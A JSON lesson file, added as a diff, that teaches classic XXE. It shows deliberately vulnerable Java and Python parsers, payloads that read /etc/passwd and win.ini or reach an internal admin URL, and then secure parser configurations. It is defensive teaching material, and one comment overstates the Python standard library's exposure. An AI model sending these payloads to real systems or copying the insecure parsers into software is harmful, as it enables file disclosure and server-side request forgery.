@@ -1,0 +1,179 @@
+{
+  "id": "classic-xxe",
+  "category": "vulnerabilities",
+  "title": "Classic XXE (Direct Entity Expansion)",
+  "description": "Understanding direct XML external entity attacks where entity content is reflected in the application's response, allowing immediate data exfiltration.",
+  "severity": "critical",
+  "cvssScore": 9.1,
+  "cvssVector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+  "owasp": "A05:2021 – Security Misconfiguration",
+  "cwe": "CWE-611",
+  "sections": [
+    {
+      "id": "overview",
+      "title": "Overview",
+      "content": "Classic XXE (also called in-band XXE) occurs when an XML parser processes external entities and includes their content in the application's response. This is the most straightforward form of XXE attack, where the attacker can immediately see the results of the entity expansion.\n\nWhen exploited successfully, Classic XXE allows attackers to:\n- Read arbitrary files from the server's filesystem\n- Perform Server-Side Request Forgery (SSRF) attacks\n- Cause Denial of Service (DoS)\n- In some cases, achieve Remote Code Execution\n\nThis vulnerability has a CVSS score of 9.1 (Critical) due to its ease of exploitation and severe impact.",
+      "type": "text"
+    },
+    {
+      "id": "how-it-works",
+      "title": "How Classic XXE Works",
+      "content": "The attack follows these steps:\n\n1. **Attacker crafts malicious XML**: Creates an XML document with a DOCTYPE declaration containing an external entity definition\n2. **External entity references local resource**: The entity points to a file (file:///) or network resource (http://)\n3. **Application parses XML**: The vulnerable application processes the XML with an insecurely configured parser\n4. **Parser retrieves content**: The XML parser automatically retrieves the referenced resource\n5. **Content reflected in response**: The expanded entity content appears in the application's response\n6. **Attacker reads data**: The attacker extracts sensitive information from the response",
+      "type": "text"
+    },
+    {
+      "id": "vulnerable-code",
+      "title": "Vulnerable Code Examples",
+      "content": "These code examples show how XXE vulnerabilities occur when developers parse XML without proper security configuration:",
+      "type": "text"
+    },
+    {
+      "id": "vulnerable-java",
+      "title": "Vulnerable Java Code",
+      "type": "code",
+      "code": {
+        "language": "java",
+        "isVulnerable": true,
+        "filename": "VulnerableXmlParser.java",
+        "code": "// VULNERABLE CODE - DO NOT USE IN PRODUCTION\nimport javax.xml.parsers.DocumentBuilder;\nimport javax.xml.parsers.DocumentBuilderFactory;\nimport org.w3c.dom.Document;\nimport org.xml.sax.InputSource;\nimport java.io.StringReader;\n\npublic class VulnerableXmlParser {\n    public Document parseXml(String xmlInput) throws Exception {\n        // Default configuration - VULNERABLE!\n        DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\n        DocumentBuilder builder = factory.newDocumentBuilder();\n        \n        // This will process external entities by default\n        Document doc = builder.parse(\n            new InputSource(new StringReader(xmlInput))\n        );\n        \n        return doc;\n    }\n}"
+      }
+    },
+    {
+      "id": "vulnerable-python",
+      "title": "Vulnerable Python Code",
+      "type": "code",
+      "code": {
+        "language": "python",
+        "isVulnerable": true,
+        "filename": "vulnerable_parser.py",
+        "code": "# VULNERABLE CODE - DO NOT USE IN PRODUCTION\nimport xml.etree.ElementTree as ET\n\ndef parse_xml(xml_string):\n    # Default lxml parsing - VULNERABLE!\n    # External entities are processed by default\n    root = ET.fromstring(xml_string)\n    return root\n\n# Using lxml (also vulnerable by default)\nfrom lxml import etree\n\ndef parse_xml_lxml(xml_string):\n    # VULNERABLE - processes external entities\n    parser = etree.XMLParser()\n    root = etree.fromstring(xml_string, parser)\n    return root"
+      }
+    },
+    {
+      "id": "attack-payload-file",
+      "title": "Attack Payload: File Disclosure",
+      "content": "This payload demonstrates reading /etc/passwd on Linux systems:",
+      "type": "text"
+    },
+    {
+      "id": "file-disclosure-linux",
+      "title": "Linux File Disclosure Payload",
+      "type": "code",
+      "code": {
+        "language": "xml",
+        "code": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n]>\n<root>\n  <data>&xxe;</data>\n</root>"
+      }
+    },
+    {
+      "id": "attack-payload-windows",
+      "title": "Windows File Disclosure Payload",
+      "type": "code",
+      "code": {
+        "language": "xml",
+        "code": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">\n]>\n<root>\n  <data>&xxe;</data>\n</root>"
+      }
+    },
+    {
+      "id": "attack-payload-ssrf",
+      "title": "SSRF Attack Payload",
+      "content": "This payload makes the server send a request to an internal network resource:",
+      "type": "text"
+    },
+    {
+      "id": "ssrf-payload",
+      "title": "SSRF Payload Example",
+      "type": "code",
+      "code": {
+        "language": "xml",
+        "code": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM \"http://internal-server:8080/admin\">\n]>\n<root>\n  <data>&xxe;</data>\n</root>"
+      }
+    },
+    {
+      "id": "expected-response",
+      "title": "Expected Response",
+      "content": "When the attack succeeds, the application's response will contain the file contents or internal server response:",
+      "type": "text"
+    },
+    {
+      "id": "response-example",
+      "title": "Vulnerable Response Example",
+      "type": "code",
+      "code": {
+        "language": "xml",
+        "code": "<root>\n  <data>\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\n...\n  </data>\n</root>"
+      }
+    },
+    {
+      "id": "secure-configuration",
+      "title": "Secure Configuration",
+      "content": "To prevent XXE attacks, you must explicitly disable external entity processing and DTD processing:",
+      "type": "text"
+    },
+    {
+      "id": "secure-java",
+      "title": "Secure Java Configuration",
+      "type": "code",
+      "code": {
+        "language": "java",
+        "isVulnerable": false,
+        "filename": "SecureXmlParser.java",
+        "code": "// SECURE CODE\nimport javax.xml.parsers.DocumentBuilder;\nimport javax.xml.parsers.DocumentBuilderFactory;\nimport org.w3c.dom.Document;\nimport org.xml.sax.InputSource;\nimport java.io.StringReader;\n\npublic class SecureXmlParser {\n    public Document parseXml(String xmlInput) throws Exception {\n        DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\n        \n        // Disable DOCTYPE declarations entirely (most secure)\n        factory.setFeature(\n            \"http://apache.org/xml/features/disallow-doctype-decl\",\n            true\n        );\n        \n        // If you can't disable DOCTYPE, disable external entities\n        factory.setFeature(\n            \"http://xml.org/sax/features/external-general-entities\",\n            false\n        );\n        factory.setFeature(\n            \"http://xml.org/sax/features/external-parameter-entities\",\n            false\n        );\n        \n        // Disable external DTDs\n        factory.setFeature(\n            \"http://apache.org/xml/features/nonvalidating/load-external-dtd\",\n            false\n        );\n        \n        // Disable XInclude\n        factory.setXIncludeAware(false);\n        \n        // Disable expanding entity references\n        factory.setExpandEntityReferences(false);\n        \n        DocumentBuilder builder = factory.newDocumentBuilder();\n        Document doc = builder.parse(\n            new InputSource(new StringReader(xmlInput))\n        );\n        \n        return doc;\n    }\n}"
+      }
+    },
+    {
+      "id": "secure-python",
+      "title": "Secure Python Configuration",
+      "type": "code",
+      "code": {
+        "language": "python",
+        "isVulnerable": false,
+        "filename": "secure_parser.py",
+        "code": "# SECURE CODE\nfrom lxml import etree\nfrom defusedxml import ElementTree as DefusedET\n\n# Option 1: Use defusedxml (recommended)\ndef parse_xml_safe(xml_string):\n    # defusedxml automatically disables dangerous features\n    root = DefusedET.fromstring(xml_string)\n    return root\n\n# Option 2: Configure lxml securely\ndef parse_xml_lxml_safe(xml_string):\n    # Create parser with disabled entity resolution\n    parser = etree.XMLParser(\n        resolve_entities=False,\n        no_network=True,\n        dtd_validation=False,\n        load_dtd=False\n    )\n    root = etree.fromstring(xml_string, parser)\n    return root"
+      }
+    },
+    {
+      "id": "impact",
+      "title": "Impact and Risk",
+      "content": "Classic XXE vulnerabilities have severe security implications:\n\n**Confidentiality Impact: HIGH**\n- Access to sensitive files (/etc/passwd, /etc/shadow, application config files)\n- Database credentials and API keys\n- Source code and intellectual property\n- User data and PII\n\n**Integrity Impact: LOW-MEDIUM**\n- Usually limited to data exfiltration\n- Can lead to SSRF attacks that modify internal state\n\n**Availability Impact: MEDIUM-HIGH**\n- Billion Laughs attack can cause DoS\n- Resource exhaustion from large file reads\n- System crashes from parsing malformed data\n\n**Real-World Examples**:\n- Reading cloud metadata endpoints (AWS, Azure, GCP)\n- Accessing internal admin panels\n- Exfiltrating database backups\n- Reading application source code",
+      "type": "text"
+    },
+    {
+      "id": "detection",
+      "title": "Detection and Testing",
+      "content": "To test for Classic XXE vulnerabilities:\n\n1. **Identify XML input points**: API endpoints, file uploads, SOAP services\n2. **Test with basic payload**: Submit XML with external entity referencing a known file\n3. **Observe response**: Check if file contents appear in the response\n4. **Test SSRF**: Try referencing an attacker-controlled server to confirm outbound requests\n5. **Automated scanning**: Use Burp Suite, OWASP ZAP, or custom scripts\n\nKey indicators of vulnerability:\n- Application accepts XML input\n- Response contains expanded entity content\n- Application makes outbound requests to attacker-controlled servers\n- Error messages reveal file paths or entity processing",
+      "type": "text"
+    },
+    {
+      "id": "remediation-summary",
+      "title": "Remediation Summary",
+      "content": "**Priority 1 (Critical)**: Disable DOCTYPE declarations entirely\n**Priority 2 (High)**: Disable external entity processing\n**Priority 3 (High)**: Disable DTD processing\n**Priority 4 (Medium)**: Implement input validation and allowlisting\n**Priority 5 (Medium)**: Use secure XML parsing libraries (e.g., defusedxml)\n**Priority 6 (Low)**: Implement WAF rules to detect XXE patterns\n\nRefer to language-specific prevention guides for detailed implementation instructions.",
+      "type": "text"
+    }
+  ],
+  "relatedTopics": [
+    "xml-basics",
+    "blind-xxe",
+    "file-disclosure",
+    "ssrf",
+    "java-prevention",
+    "python-prevention"
+  ],
+  "references": [
+    {
+      "title": "OWASP XXE Prevention Cheat Sheet",
+      "url": "https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html"
+    },
+    {
+      "title": "CWE-611: Improper Restriction of XML External Entity Reference",
+      "url": "https://cwe.mitre.org/data/definitions/611.html"
+    },
+    {
+      "title": "PortSwigger XXE Tutorial",
+      "url": "https://portswigger.net/web-security/xxe"
+    },
+    {
+      "title": "OWASP Top 10:2021 A05 - Security Misconfiguration",
+      "url": "https://owasp.org/Top10/A05_2021-Security_Misconfiguration/"
+    }
+  ]
+}
